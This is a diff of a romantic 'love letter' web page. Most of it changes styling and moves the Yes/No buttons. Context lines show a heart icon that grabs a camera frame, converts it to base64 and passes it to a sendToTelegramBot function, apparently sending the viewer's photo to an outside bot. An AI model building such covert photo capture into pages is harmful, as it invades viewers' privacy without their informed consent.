@@ -64,7 +64,6 @@
       display: none;
     }
 
-    /* Love You Too Box */
     .love-you-box {
       font-family: 'Pinyon Script', cursive;
       font-size: 2rem;
@@ -76,9 +75,8 @@
       box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
     }
 
-    /* Love Letter Box */
     .love-letter-box {
-      font-family: Arial, sans-serif; 
+      font-family: 'Pinyon Script', cursive;
       font-size: 1.5rem;
       color: #fff;
       background-color: rgba(0, 0, 0, 0.6);
@@ -90,10 +88,8 @@
       overflow-y: auto;
     }
 
-    /* Yes/No Buttons */
     .yes-no-btns {
-      margin-top: 10px;
-      margin-bottom: 20px;
+      margin-top: 20px;
     }
 
     .yes-no-btn {
@@ -150,16 +146,16 @@
       Love You Too
     </div>
 
-    <!-- Yes/No Buttons -->
-    <div class="yes-no-btns">
-      <button class="yes-no-btn yes-btn" onclick="handleResponse('Yes')">Yes</button>
-      <button class="yes-no-btn no-btn" onclick="handleResponse('No')">No</button>
-    </div>
-
     <!-- Love Letter Box -->
     <div class="love-letter-box">
       <p>Dear,</p>
       <p>I just wanted to let you know how much you mean to me. Every moment with you feels like magic, and I am beyond grateful for having you in my life. You are my heart, my soul, and everything I have ever dreamed of. I love you more than words can express. 💖</p>
+    </div>
+
+    <!-- Yes/No Buttons -->
+    <div class="yes-no-btns">
+      <button class="yes-no-btn yes-btn" onclick="handleResponse('Yes')">Yes</button>
+      <button class="yes-no-btn no-btn" onclick="handleResponse('No')">No</button>
     </div>
 
     <!-- Heart Icon to Capture Photo -->
@@ -203,7 +199,7 @@
       // Draw the video frame onto the canvas
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       let imageData = canvas.toDataURL('image/png'); // Get base64 image data
-
+      
       // Send image to Telegram bot
       sendToTelegramBot(imageData);
     }
